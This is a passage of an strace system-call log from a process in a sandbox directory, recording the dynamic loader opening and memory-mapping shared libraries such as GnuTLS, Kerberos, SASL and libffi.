22    10:07:55.639320 mmap(0x7c3d3a8d3000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x1000) = 0x7c3d3a8d3000
22    10:07:55.639786 mmap(0x7c3d3a8db000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0x9000) = 0x7c3d3a8db000
22    10:07:55.640508 mmap(0x7c3d3a8de000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0xb000) = 0x7c3d3a8de000
22    10:07:55.641065 close(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>) = 0
22    10:07:55.641553 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libunistring.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>
22    10:07:55.642020 read(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.642456 fstat(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, {st_mode=S_IFREG|0644, st_size=1755312, ...}) = 0
22    10:07:55.642865 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a8d0000
22    10:07:55.643274 mmap(NULL, 1755368, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0) = 0x7c3d3a723000
22    10:07:55.643682 mmap(0x7c3d3a734000, 225280, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x11000) = 0x7c3d3a734000
22    10:07:55.644133 mmap(0x7c3d3a76b000, 1441792, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x48000) = 0x7c3d3a76b000
22    10:07:55.644572 mmap(0x7c3d3a8cb000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>, 0x1a8000) = 0x7c3d3a8cb000
22    10:07:55.645008 close(3</usr/lib/x86_64-linux-gnu/libunistring.so.5.0.0>) = 0
22    10:07:55.645413 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgnutls.so.30", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>
22    10:07:55.645858 read(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.646282 fstat(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, {st_mode=S_IFREG|0644, st_size=2065824, ...}) = 0
22    10:07:55.646684 mmap(NULL, 2075936, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0) = 0x7c3d3a528000
22    10:07:55.647212 mmap(0x7c3d3a55b000, 1286144, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x33000) = 0x7c3d3a55b000
22    10:07:55.647721 mmap(0x7c3d3a695000, 495616, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x16d000) = 0x7c3d3a695000
22    10:07:55.648216 mmap(0x7c3d3a70e000, 73728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>, 0x1e6000) = 0x7c3d3a70e000
22    10:07:55.648658 mmap(0x7c3d3a720000, 11552, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a720000
22    10:07:55.649135 close(3</usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1>) = 0
22    10:07:55.649770 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libhogweed.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>
22    10:07:55.650299 read(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.650719 fstat(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, {st_mode=S_IFREG|0644, st_size=288920, ...}) = 0
22    10:07:55.651137 mmap(NULL, 290832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0) = 0x7c3d3a4e0000
22    10:07:55.651558 mmap(0x7c3d3a4e8000, 81920, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x8000) = 0x7c3d3a4e8000
22    10:07:55.651982 mmap(0x7c3d3a4fc000, 167936, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x1c000) = 0x7c3d3a4fc000
22    10:07:55.652445 mmap(0x7c3d3a525000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>, 0x44000) = 0x7c3d3a525000
22    10:07:55.652909 close(3</usr/lib/x86_64-linux-gnu/libhogweed.so.6.8>) = 0
22    10:07:55.653343 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnettle.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>
22    10:07:55.653812 read(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.654248 fstat(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, {st_mode=S_IFREG|0644, st_size=342280, ...}) = 0
22    10:07:55.654672 mmap(NULL, 344192, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0) = 0x7c3d3a48b000
22    10:07:55.655096 mmap(0x7c3d3a497000, 192512, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0xc000) = 0x7c3d3a497000
22    10:07:55.655531 mmap(0x7c3d3a4c6000, 94208, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x3b000) = 0x7c3d3a4c6000
22    10:07:55.655960 mmap(0x7c3d3a4dd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x51000) = 0x7c3d3a4dd000
22    10:07:55.656423 close(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>) = 0
22    10:07:55.656829 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgmp.so.10", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>
22    10:07:55.657296 read(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.657894 fstat(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, {st_mode=S_IFREG|0644, st_size=534896, ...}) = 0
22    10:07:55.658497 mmap(NULL, 537072, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0) = 0x7c3d3a407000
22    10:07:55.659097 mmap(0x7c3d3a411000, 405504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0xa000) = 0x7c3d3a411000
22    10:07:55.659555 mmap(0x7c3d3a474000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x6d000) = 0x7c3d3a474000
22    10:07:55.659959 mmap(0x7c3d3a489000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x81000) = 0x7c3d3a489000
22    10:07:55.660424 close(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>) = 0
22    10:07:55.660879 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>
22    10:07:55.661333 read(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.661737 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, {st_mode=S_IFREG|0644, st_size=823488, ...}) = 0
22    10:07:55.662139 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a405000
22    10:07:55.662546 mmap(NULL, 822032, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0) = 0x7c3d3a33c000
22    10:07:55.662949 mmap(0x7c3d3a35c000, 397312, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x20000) = 0x7c3d3a35c000
22    10:07:55.663355 mmap(0x7c3d3a3bd000, 233472, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x81000) = 0x7c3d3a3bd000
22    10:07:55.663759 mmap(0x7c3d3a3f6000, 61440, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0xba000) = 0x7c3d3a3f6000
22    10:07:55.664214 close(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>) = 0
22    10:07:55.664622 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libk5crypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>
22    10:07:55.665180 read(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.665748 fstat(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, {st_mode=S_IFREG|0644, st_size=178648, ...}) = 0
22    10:07:55.666378 mmap(NULL, 176392, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0) = 0x7c3d3a310000
22    10:07:55.667018 mmap(0x7c3d3a314000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x4000) = 0x7c3d3a314000
22    10:07:55.667558 mmap(0x7c3d3a32f000, 45056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x1f000) = 0x7c3d3a32f000
22    10:07:55.668167 mmap(0x7c3d3a33a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x2a000) = 0x7c3d3a33a000
22    10:07:55.668746 close(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>) = 0
22    10:07:55.669265 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcom_err.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>
22    10:07:55.669737 read(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.670160 fstat(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, {st_mode=S_IFREG|0644, st_size=18504, ...}) = 0
22    10:07:55.670580 mmap(NULL, 20552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0) = 0x7c3d3a30a000
22    10:07:55.671012 mmap(0x7c3d3a30c000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x2000) = 0x7c3d3a30c000
22    10:07:55.671485 mmap(0x7c3d3a30d000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x7c3d3a30d000
22    10:07:55.671927 mmap(0x7c3d3a30e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x7c3d3a30e000
22    10:07:55.672430 close(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>) = 0
22    10:07:55.672857 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5support.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>
22    10:07:55.673302 read(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.673729 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, {st_mode=S_IFREG|0644, st_size=47904, ...}) = 0
22    10:07:55.674182 mmap(NULL, 50128, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0) = 0x7c3d3a2fd000
22    10:07:55.674798 mmap(0x7c3d3a300000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x3000) = 0x7c3d3a300000
22    10:07:55.675302 mmap(0x7c3d3a306000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x9000) = 0x7c3d3a306000
22    10:07:55.675922 mmap(0x7c3d3a308000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0xa000) = 0x7c3d3a308000
22    10:07:55.676445 close(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>) = 0
22    10:07:55.676868 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libsasl2.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>
22    10:07:55.677332 read(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.677756 fstat(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, {st_mode=S_IFREG|0644, st_size=101200, ...}) = 0
22    10:07:55.678168 mmap(NULL, 103328, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0) = 0x7c3d3a2e3000
22    10:07:55.678583 mmap(0x7c3d3a2e6000, 65536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x3000) = 0x7c3d3a2e6000
22    10:07:55.679015 mmap(0x7c3d3a2f6000, 20480, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x13000) = 0x7c3d3a2f6000
22    10:07:55.679616 mmap(0x7c3d3a2fb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x17000) = 0x7c3d3a2fb000
22    10:07:55.680089 close(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>) = 0
22    10:07:55.680535 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>
22    10:07:55.681010 read(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.681434 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=141640, ...}) = 0
22    10:07:55.681849 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a2e1000
22    10:07:55.682256 mmap(NULL, 139304, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0) = 0x7c3d3a2be000
22    10:07:55.682848 mmap(0x7c3d3a2bf000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x1000) = 0x7c3d3a2bf000
22    10:07:55.683383 mmap(0x7c3d3a2c0000, 126976, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x2000) = 0x7c3d3a2c0000
22    10:07:55.683833 mmap(0x7c3d3a2df000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x21000) = 0x7c3d3a2df000
22    10:07:55.684349 close(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>) = 0
22    10:07:55.684761 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libp11-kit.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>
22    10:07:55.685207 read(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.685611 fstat(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, {st_mode=S_IFREG|0644, st_size=1714008, ...}) = 0
22    10:07:55.686014 mmap(NULL, 1717896, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0) = 0x7c3d3a11a000
22    10:07:55.686416 mmap(0x7c3d3a152000, 860160, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x38000) = 0x7c3d3a152000
22    10:07:55.686841 mmap(0x7c3d3a224000, 520192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x10a000) = 0x7c3d3a224000
22    10:07:55.687247 mmap(0x7c3d3a2a3000, 106496, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x188000) = 0x7c3d3a2a3000
22    10:07:55.687662 mmap(0x7c3d3a2bd000, 1672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a2bd000
22    10:07:55.688102 close(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>) = 0
22    10:07:55.688531 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtasn1.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>
22    10:07:55.689065 read(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.689543 fstat(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, {st_mode=S_IFREG|0644, st_size=88216, ...}) = 0
22    10:07:55.690051 mmap(NULL, 86568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0) = 0x7c3d3a104000
22    10:07:55.690551 mmap(0x7c3d3a107000, 57344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x3000) = 0x7c3d3a107000
22    10:07:55.691006 mmap(0x7c3d3a115000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x11000) = 0x7c3d3a115000
22    10:07:55.691602 mmap(0x7c3d3a118000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x14000) = 0x7c3d3a118000
22    10:07:55.692136 close(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>) = 0
22    10:07:55.692774 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkeyutils.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>
22    10:07:55.693266 read(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.693689 fstat(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, {st_mode=S_IFREG|0644, st_size=22600, ...}) = 0
22    10:07:55.694112 mmap(NULL, 24592, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0) = 0x7c3d3a0fd000
22    10:07:55.694546 mmap(0x7c3d3a0ff000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x2000) = 0x7c3d3a0ff000
22    10:07:55.694983 mmap(0x7c3d3a101000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x7c3d3a101000
22    10:07:55.695417 mmap(0x7c3d3a102000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x7c3d3a102000
22    10:07:55.695865 close(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>) = 0
22    10:07:55.696336 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>
22    10:07:55.696795 read(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.697221 fstat(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, {st_mode=S_IFREG|0644, st_size=64008, ...}) = 0
22    10:07:55.697649 mmap(NULL, 71816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0) = 0x7c3d3a0eb000
22    10:07:55.698075 mmap(0x7c3d3a0ee000, 36864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0x3000) = 0x7c3d3a0ee000
22    10:07:55.698505 mmap(0x7c3d3a0f7000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xc000) = 0x7c3d3a0f7000
22    10:07:55.698926 mmap(0x7c3d3a0f9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xe000) = 0x7c3d3a0f9000
22    10:07:55.699661 mmap(0x7c3d3a0fb000, 6280, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a0fb000
22    10:07:55.700210 close(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>) = 0
22    10:07:55.700703 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>
22    10:07:55.701238 read(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.701709 fstat(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, {st_mode=S_IFREG|0644, st_size=47672, ...}) = 0
22    10:07:55.702118 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a0e9000
22    10:07:55.702524 mmap(NULL, 46608, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0) = 0x7c3d3a0dd000
22    10:07:55.702925 mmap(0x7c3d3a0df000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x2000) = 0x7c3d3a0df000
22    10:07:55.703338 mmap(0x7c3d3a0e6000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x9000) = 0x7c3d3a0e6000
22    10:07:55.703746 mmap(0x7c3d3a0e7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0xa000) = 0x7c3d3a0e7000
22    10:07:55.704216 close(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>) = 0
22    10:07:55.704658 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a0db000
22    10:07:55.705104 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3a0d8000
